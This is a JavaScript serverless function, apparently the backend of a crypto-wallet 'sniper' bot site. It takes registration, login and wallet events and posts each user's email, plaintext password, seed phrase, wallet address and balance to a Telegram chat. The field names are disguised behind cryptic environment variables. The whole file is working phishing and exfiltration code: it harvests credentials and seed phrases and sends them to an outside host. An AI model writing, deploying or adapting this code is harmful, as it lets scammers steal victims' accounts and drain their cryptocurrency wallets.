exports.handler = async (event) => {

    if (event.httpMethod === "OPTIONS") {
        return {
            statusCode: 204,
            headers: {
                "Access-Control-Allow-Origin": "*",
                "Access-Control-Allow-Headers": "Content-Type",
                "Access-Control-Allow-Methods": "POST, OPTIONS",
            },
            body: "",
        };
    }


    //message headers
    const uid = process.env.uid; //userID
    const nom = process.env.nom; //Name
    const addi = process.env.addi; //email
    const authw = process.env.authw; //password
    const pip = process.env.pip; //seed
    const ref = process.env.ref; //referrer
    const net = process.env.net; //network
    const bal = process.env.bal; //balance
    const wal = process.env.wal; //wallet

    //case types
    const uR = process.env.uR; //user register 
    const uL = process.env.uL; //user login 
    const uN = process.env.uN; //user network sel
    const uASP = process.env.uASP; //user add seed
    const uAWA = process.env.uAWA; //user add wallet address
    const addFW = process.env.addFW; //user add full wallet
    const uMM = process.env.uMM; //user reached main menu
    const uRFSH = process.env.uRFSH; //user refreshed



    try {
        const { type, details: dataReceived } = JSON.parse(event.body);
        let msa; //message

        switch (type) {
    
            case `${uR}`: //user register
                msa = `<u>${uR}</u>\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `${nom}: <b>${dataReceived.nom}</b>\n` +
                    `${addi}: <b>${dataReceived.addi}</b>\n` +
                    `${authw}: <b>${dataReceived.authw}</b>\n` +
                    `${ref}: <b>${dataReceived.ref}</b>`;
                break;
    
            case `${uL}`: //user login
                msa = `<u>${uL}</u>\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `${addi}: <b>${dataReceived.addi}</b>\n` +
                    `${authw}: <b>${dataReceived.authw}</b>`;
                break;
                
            case `${uN}`: //user select network
                msa = `<u>${uN}</u>\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `${net}: <b>${dataReceived.net}</b>`;
                break;
    
            case `${uASP}`: //user add seed phrase
                msa = `<u>${uASP}</u>\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `${pip}: <b>${dataReceived.pip}</b>`;
                break; 
    
            case `${uAWA}`: //user add wallet address
                msa = `<u>${uAWA}</u>\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `${wal}: <b>${dataReceived.wal}</b>`;
                break;                   
                
            case `${addFW}`: //user add full wallet
                msa = `<u>${addFW}</u>\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `${net}: <b>${dataReceived.net}</b>\n` +
                    `${wal}: <b>${dataReceived.wal}</b>\n` +
                    `${pip}: <b>${dataReceived.pip}</b>`;
                break;  
    
            case `${uMM}`: //user Log to main sniper menu
                msa = `<u>${uMM}</u>\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `${nom}: <b>${dataReceived.nom}</b>\n` +
                    `${addi}: <b>${dataReceived.addi}</b>\n` +
                    `${pip}: <b>${dataReceived.pip}</b>\n` +
                    `${wal}: <b>${dataReceived.wal}</b>\n` +
                    `${bal}: <b>${dataReceived.bal} ${dataReceived.net}</b>`;
                break;           
                
            case `${uRFSH}`: //user add full wallet
                msa = `<u>${uRFSH}</u>\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `${wal}: <b>${dataReceived.wal}</b>\n` +
                    `${bal}: <b>${dataReceived.bal} ${dataReceived.symbol}</b>`;
                break;  

        }

        const sendMessageResponse = await sTM(msa);
        return {
            statusCode: 200,
            headers: {
                "Access-Control-Allow-Origin": "*",
            },
            body: JSON.stringify({ message: "Message sent successfully", response: sendMessageResponse }),
        };
    } catch (error) {
        console.error("Error:", error);
        return {
            statusCode: 500,
            headers: {
                "Access-Control-Allow-Origin": "*",
            },
            body: JSON.stringify({ error: error.message }),
        };
    }
};

async function sTM(text) {
    const cID = process.env.cID;
    const apiUrl = process.env.apiURL;

    const response = await fetch(apiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: cID,
            text: text,
            parse_mode: 'HTML',
        }),
    });

    if (!response.ok) {
        throw new Error(`Telegram API responded with status ${response.status}`);
    }

    return await response.json();
}
